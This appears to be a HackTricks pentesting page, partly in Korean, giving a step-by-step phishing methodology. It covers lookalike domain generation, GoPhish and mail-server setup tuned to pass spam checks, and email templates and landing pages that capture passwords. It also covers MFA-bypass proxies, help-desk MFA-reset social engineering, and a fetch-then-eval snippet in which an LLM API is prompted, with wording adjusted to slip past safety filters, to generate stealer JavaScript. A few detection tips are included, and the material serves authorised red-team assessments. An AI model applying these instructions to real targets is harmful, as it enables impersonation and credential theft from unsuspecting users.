# Phishing 방법론

{{#include ../../banners/hacktricks-training.md}}

## 방법론

1. Recon 대상
1. **대상 도메인** 선택.
2. 피해자가 사용하는 **로그인 포털 검색(searching for login portals)**을 위한 기본 웹 열거를 수행하고, 어떤 포털을 **사칭(impersonate)**할지 **결정(decide)**.
3. 일부 **OSINT**를 사용하여 **이메일 찾기(find emails)**.
2. 환경 준비
1. **구매할 도메인**: phishing assessment에 사용할 도메인을 **구매**합니다.
2. **이메일 서비스 관련 레코드 구성** (SPF, DMARC, DKIM, rDNS)
3. **gophish**로 VPS 구성
3. 캠페인 준비
1. **이메일 템플릿** 준비
2. 자격 증명을 탈취하기 위한 **웹 페이지** 준비
4. 캠페인 시작!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: 원래 도메인의 중요한 **keyword**를 도메인 이름에 **포함** (예: zelster.com-management.com).
- **hypened subdomain**: 서브도메인의 **dot을 하이픈으로 변경** (예: www-zelster.com).
- **New TLD**: 같은 도메인을 **새 TLD**로 사용 (예: zelster.org)
- **Homoglyph**: 도메인 이름의 글자를 **비슷하게 보이는 문자로 대체** (예: zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** 도메인 이름 내 두 글자를 **교환** (예: zelsetr.com).
- **Singularization/Pluralization**: 도메인 이름 끝에 “s”를 추가하거나 제거 (예: zeltsers.com).
- **Omission**: 도메인 이름에서 글자 하나를 **생략** (예: zelser.com).
- **Repetition:** 도메인 이름의 글자 하나를 **반복** (예: zeltsser.com).
- **Replacement**: homoglyph와 비슷하지만 덜 은밀함. 도메인 이름의 글자 하나를 키보드상에서 인접한 글자 등으로 **대체** (예: zektser.com).
- **Subdomained**: 도메인 이름 내부에 **dot 추가** (예: ze.lster.com).
- **Insertion**: 도메인 이름에 **문자 삽입** (예: zerltser.com).
- **Missing dot**: 도메인 이름에 TLD를 붙여 추가 (예: zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

저장되거나 통신 중인 일부 비트가 태양 플레어, 우주선(우주방사선), 하드웨어 오류 등 다양한 요인으로 인해 **자동으로 뒤바뀔 가능성**이 있습니다.

이 개념을 **DNS 요청에 적용할 때**, DNS 서버가 수신한 도메인이 처음 요청한 도메인과 같지 않을 수 있습니다.

예를 들어, 도메인 "windows.com"에서 단일 비트가 변경되면 "windnws.com"으로 바뀔 수 있습니다.

공격자는 피해자의 도메인과 유사한 여러 개의 bit-flipping 도메인을 등록하여 이를 악용하고 합법적인 사용자를 자신의 인프라로 리다이렉트하려 할 수 있습니다.

자세한 내용은 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)를 읽어보세요.

### Buy a trusted domain

만료된 도메인 중 사용할 수 있는 도메인을 [https://www.expireddomains.net/](https://www.expireddomains.net)에서 검색할 수 있습니다.\
구매하려는 만료 도메인이 이미 좋은 SEO를 가지고 있는지 확인하려면 다음에서 어떻게 분류되어 있는지 확인하세요:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% 무료)
- [https://phonebook.cz/](https://phonebook.cz) (100% 무료)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

더 많은 유효한 이메일 주소를 발견하거나 이미 찾은 주소를 검증하려면 피해자의 SMTP 서버에 대해 사용자명 무차별 대입(username bruteforce)으로 확인할 수 있습니다. [여기](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)에서 이메일 주소 검증/발견 방법을 확인하세요.\
또한 사용자가 이메일에 접근하기 위해 **any web portal to access their mails**을 사용하는 경우, 해당 포털이 **username brute force**에 취약한지 확인하고 가능하다면 해당 취약점을 악용하세요.

## Configuring GoPhish

### Installation

다음에서 다운로드할 수 있습니다: [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

다운로드하여 `/opt/gophish`에 압축 해제하고 `/opt/gophish/gophish`를 실행합니다.\
출력에 포트 3333에 대한 관리자(admin) 사용자 비밀번호가 표시됩니다. 따라서 해당 포트에 접근하여 그 자격증명을 사용해 관리자 비밀번호를 변경하세요. 필요하면 해당 포트를 로컬로 터널링해야 할 수 있습니다:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 구성

**TLS 인증서 구성**

이 단계 이전에 사용하려는 **이미 구매한 도메인**을 보유하고 있어야 하며, 해당 도메인이 **gophish**를 구성하고 있는 **VPS의 IP**를 가리키고 있어야 합니다.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**메일 구성**

설치 시작: `apt-get install postfix`

그런 다음 도메인을 다음 파일들에 추가하세요:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**다음 변수들의 값을 /etc/postfix/main.cf 내에서 변경하세요**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

마지막으로 파일 **`/etc/hostname`** 및 **`/etc/mailname`** 을(를) 도메인 이름으로 수정하고 **VPS를 재시작**하세요.

이제 VPS의 **IP 주소**를 가리키도록 `mail.<domain>`의 **DNS A record**를 생성하고, `mail.<domain>`을 가리키는 **DNS MX** 레코드도 생성하세요.

이제 이메일 전송을 테스트해봅니다:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 구성**

gophish의 실행을 중지하고 구성합시다.\  
다음과 같이 `/opt/gophish/config.json`을 수정하세요 (https 사용에 유의):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish 서비스 구성**

gophish 서비스를 자동으로 시작하고 서비스로 관리할 수 있도록 만들려면 다음 내용을 가진 파일 `/etc/init.d/gophish`를 생성하세요:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
서비스 구성을 완료하고 작동 여부를 확인하세요:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 메일 서버와 도메인 구성

### 기다리고 정상적으로 보이기

도메인이 오래될수록 spam으로 분류될 가능성이 낮아집니다. 따라서 phishing assessment 전에 가능한 한 오래(최소 1주일) 기다려야 합니다. 또한 평판 관련 섹터에 대한 페이지를 넣으면 얻는 평판이 더 좋아집니다.

일주일을 기다려야 하더라도 지금 모든 설정을 마칠 수 있다는 점에 유의하세요.

### Reverse DNS (rDNS) 레코드 구성

VPS의 IP 주소가 도메인 이름으로 역방향 조회되도록 rDNS (PTR) 레코드를 설정하세요.

### Sender Policy Framework (SPF) 레코드

새 도메인에 대해 **SPF 레코드를 구성해야 합니다**. SPF 레코드가 무엇인지 모르면 [**이 페이지를 읽어보세요**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF 정책을 생성하려면 [https://www.spfwizard.net/](https://www.spfwizard.net) 를 사용할 수 있습니다 (VPS 머신의 IP 사용)

![](<../../images/image (1037).png>)

다음은 도메인의 TXT 레코드에 설정해야 하는 내용입니다:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) 레코드

새 도메인에 대해 **DMARC 레코드를 구성해야 합니다**. DMARC 레코드가 무엇인지 모르면 [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

호스트명 `_dmarc.<domain>`를 가리키도록 다음 내용을 갖는 새 DNS TXT 레코드를 생성해야 합니다:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

반드시 **새 도메인에 DKIM을 구성해야 합니다**. DMARC 레코드가 무엇인지 모르면 [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

이 튜토리얼은 다음을 기반으로 합니다: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM 키가 생성하는 두 개의 B64 값을 연결해야 합니다:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 이메일 구성 점수 확인

다음 사이트를 사용하여 확인할 수 있습니다: [https://www.mail-tester.com/](https://www.mail-tester.com)\
페이지에 접속하여 그들이 제공하는 주소로 이메일을 보내세요:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
또한 `check-auth@verifier.port25.com`로 이메일을 보내 **이메일 설정을 확인**하고 **응답을 읽어보세요** (이를 위해서는 **포트** **25**를 열어야 하고, 이메일을 root로 보낼 경우 _/var/mail/root_ 파일에서 응답을 확인해야 합니다).\
모든 테스트를 통과했는지 확인하세요:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
자신이 제어하는 **Gmail로 메시지를 보내는** 방법도 있으며, Gmail 받은편지함에서 **이메일 헤더**를 확인하면 `Authentication-Results` 헤더 필드에 `dkim=pass`가 있어야 합니다.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- 발신자 프로필을 식별할 수 있는 **이름을 설정**하세요
- 어떤 계정에서 피싱 이메일을 보낼지 결정하세요. 예시: _noreply, support, servicedesk, salesforce..._
- username과 password를 비워 둘 수 있지만, 반드시 **Ignore Certificate Errors**를 체크하세요

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> It's recommended to use the "**Send Test Email**" functionality to test that everything is working.\
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

### Email Template

- 템플릿을 식별할 수 있는 **이름을 설정**하세요
- 그런 다음 **subject**를 작성하세요 (이상한 내용 없이 일반 이메일에서 볼 수 있는 문구로)
- 반드시 "**Add Tracking Image**"를 체크했는지 확인하세요
- 이메일 템플릿을 작성하세요 (다음 예시처럼 변수를 사용할 수 있습니다):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:

- Send an email to a **non existent address** and check if the response has any signature.
- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an email and wait for the response.
- Try to contact **some valid discovered** email and wait for the response

![](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Write a **name**
- **Write the HTML code** of the web page. Note that you can **import** web pages.
- Mark **Capture Submitted Data** and **Capture Passwords**
- Set a **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> Usually you will need to modify the HTML code of the page and make some tests in local (maybe using some Apache server) **until you like the results.** Then, write that HTML code in the box.\
> Note that if you need to **use some static resources** for the HTML (maybe some CSS and JS pages) you can save them in _**/opt/gophish/static/endpoint**_ and then access them from _**/static/\<filename>**_

> [!TIP]
> For the redirection you could **redirect the users to the legit main web page** of the victim, or redirect them to _/static/migration.html_ for example, put some **spinning wheel (**[**https://loading.io/**](https://loading.io)**) for 5 seconds and then indicate that the process was successful**.

### Users & Groups

- Set a name
- **Import the data** (note that in order to use the template for the example you need the firstname, last name and email address of each user)

![](<../../images/image (163).png>)

### Campaign

Finally, create a campaign selecting a name, the email template, the landing page, the URL, the sending profile and the group. Note that the URL will be the link sent to the victims

Note that the **Sending Profile allow to send a test email to see how will the final phishing email looks like**:

![](<../../images/image (192).png>)

> [!TIP]
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

Once everything is ready, just launch the campaign!

## Website Cloning

If for any reason you want to clone the website check the following page:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In some phishing assessments (mainly for Red Teams) you will want to also **send files containing some kind of backdoor** (maybe a C2 or maybe just something that will trigger an authentication).\
Check out the following page for some examples:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

The previous attack is pretty clever as you are faking a real website and gathering the information set by the user. Unfortunately, if the user didn't put the correct password or if the application you faked is configured with 2FA, **this information won't allow you to impersonate the tricked user**.

This is where tools like [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) and [**muraena**](https://github.com/muraenateam/muraena) are useful. This tool will allow you to generate a MitM like attack. Basically, the attacks works in the following way:

1. You **impersonate the login** form of the real webpage.
2. The user **send** his **credentials** to your fake page and the tool send those to the real webpage, **checking if the credentials work**.
3. If the account is configured with **2FA**, the MitM page will ask for it and once the **user introduces** it the tool will send it to the real web page.
4. Once the user is authenticated you (as attacker) will have **captured the credentials, the 2FA, the cookie and any information** of every interaction your while the tool is performing a MitM.

### Via VNC

What if instead of **sending the victim to a malicious page** with the same looks as the original one, you send him to a **VNC session with a browser connected to the real web page**? You will be able to see what he does, steal the password, the MFA used, the cookies...\
You can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviously one of the best ways to know if you have been busted is to **search your domain inside blacklists**. If it appears listed, somehow your domain was detected as suspicions.\
One easy way to check if you domain appears in any blacklist is to use [https://malwareworld.com/](https://malwareworld.com)

However, there are other ways to know if the victim is **actively looking for suspicions phishing activity in the wild** as explained in:


{{#ref}}
detecting-phising.md
{{#endref}}

You can **buy a domain with a very similar name** to the victims domain **and/or generate a certificate** for a **subdomain** of a domain controlled by you **containing** the **keyword** of the victim's domain. If the **victim** perform any kind of **DNS or HTTP interaction** with them, you will know that **he is actively looking** for suspicious domains and you will need to be very stealth.

### Evaluate the phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)to evaluate if your email is going to end in the spam folder or if it's going to be blocked or successful.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.

### Attack flow
1. Recon the victim
* Harvest personal & corporate details from LinkedIn, data breaches, public GitHub, etc.
* Identify high-value identities (executives, IT, finance) and enumerate the **exact help-desk process** for password / MFA reset.
2. Real-time social engineering
* Phone, Teams or chat the help-desk while impersonating the target (often with **spoofed caller-ID** or **cloned voice**).
* Provide the previously-collected PII to pass knowledge-based verification.
* Convince the agent to **reset the MFA secret** or perform a **SIM-swap** on a registered mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Establish a foothold through any web SSO portal.
* Enumerate AD / AzureAD with built-ins (no binaries dropped):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement with **WMI**, **PsExec**, or legitimate **RMM** agents already whitelisted in the environment.

### Detection & Mitigation
* Treat help-desk identity recovery as a **privileged operation** – require step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules that alert on:
* MFA method changed + authentication from new device / geo.
* Immediate elevation of the same principal (user-→-admin).
* Record help-desk calls and enforce a **call-back to an already-registered number** before any reset.
* Implement **Just-In-Time (JIT) / Privileged Access** so newly reset accounts do **not** automatically inherit high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks into the delivery channel**.

1. **SEO poisoning / malvertising** pushes a fake result such as `chromium-update[.]site` to the top search ads.
2. Victim downloads a small **first-stage loader** (often JS/HTA/ISO).  Examples seen by Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, then pulls a **silent loader** which decides – *in realtime* – whether to deploy:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains & enforce **Advanced DNS / URL Filtering** on *search-ads* as well as e-mail.
* Restrict software installation to signed MSI / Store packages, deny `HTA`, `ISO`, `VBS` execution by policy.
* Monitor for child processes of browsers opening installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

---

## AI-Enhanced Phishing Operations
Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** for high-risk phone requests.
• Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 생성된 코드가 미끼를 개인화(예: LogoKit token parsing)하고 prompt-hidden endpoint로 creds를 posts합니다.

**Evasion traits**
- 트래픽이 잘 알려진 LLM 도메인이나 신뢰할 수 있는 CDN 프록시로 향함; 때로는 WebSockets를 통해 백엔드로 전달됩니다.
- 정적 페이로드 없음; 악성 JS는 렌더 이후에만 존재합니다.
- 비결정적 생성은 세션별로 **unique** stealers를 생성합니다.

**Detection ideas**
- JS가 활성화된 sandboxes를 실행; **runtime `eval`/dynamic script creation sourced from LLM responses**를 플래그하세요.
- front-end의 LLM APIs로의 POSTs가 반환된 텍스트에 대한 `eval`/`Function`으로 즉시 이어지는지 탐색하세요.
- 클라이언트 트래픽에서 승인되지 않은 LLM 도메인이 확인되고 이후 credential POSTs가 발생하면 경고하세요.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
고전적인 push-bombing 외에, 운영자들은 help-desk call 중에 단순히 **force a new MFA registration**를 수행하여 사용자의 기존 토큰을 무효화합니다. 이후의 모든 로그인 프롬프트는 피해자에게 합법적으로 보입니다.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
동일한 IP에서 몇 분 이내에 **`deleteMFA` + `addMFA`**가 발생하는 AzureAD/AWS/Okta 이벤트를 모니터링하세요.



## Clipboard Hijacking / Pastejacking

공격자는 손상되었거나 typosquatted된 웹 페이지에서 피해자의 clipboard에 악성 명령을 은밀히 복사한 뒤, 사용자가 **Win + R**, **Win + X** 또는 terminal window에 붙여넣도록 속여 다운로드나 첨부파일 없이 임의의 코드를 실행하게 할 수 있습니다.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Mobile‑gated phishing to evade crawlers/sandboxes
운영자들은 데스크톱 crawlers가 최종 페이지에 도달하지 못하도록 간단한 기기 검사를 통해 phishing flows를 제한하는 방식을 점점 더 자주 사용합니다. 일반적인 패턴은 터치 가능한 DOM을 검사하고 그 결과를 서버 엔드포인트로 전송하는 작은 스크립트입니다; 비모바일 클라이언트는 HTTP 500(또는 빈 페이지)를 받는 반면, 모바일 사용자에게는 전체 flow가 제공됩니다.

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 로직 (단순화):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
서버에서 자주 관찰되는 동작:
- 첫 로드 시 session cookie를 설정합니다.
- `POST /detect {"is_mobile":true|false}` 요청을 허용합니다.
- 후속 GET 요청에 대해 `is_mobile=false`일 때 500 (또는 플레이스홀더)을 반환합니다; phishing은 `true`일 때만 제공됩니다.

헌팅 및 탐지 휴리스틱:
- urlscan 쿼리: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: `GET /static/detect_device.js` → `POST /detect` → non‑mobile의 경우 HTTP 500; 합법적인 모바일 피해자 경로는 200을 반환하고 후속 HTML/JS를 제공함.
- 콘텐츠를 전적으로 `ontouchstart` 또는 유사한 디바이스 검사에만 의존하여 조건부로 제공하는 페이지는 차단하거나 면밀히 검토하세요.

방어 팁:
- 모바일 유사 fingerprints와 JS를 활성화한 크롤러를 실행하여 게이트된 콘텐츠를 드러내세요.
- 신규 등록 도메인에서 `POST /detect` 이후 발생하는 의심스러운 500 응답에 대해 경보를 설정하세요.

## 참고자료

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
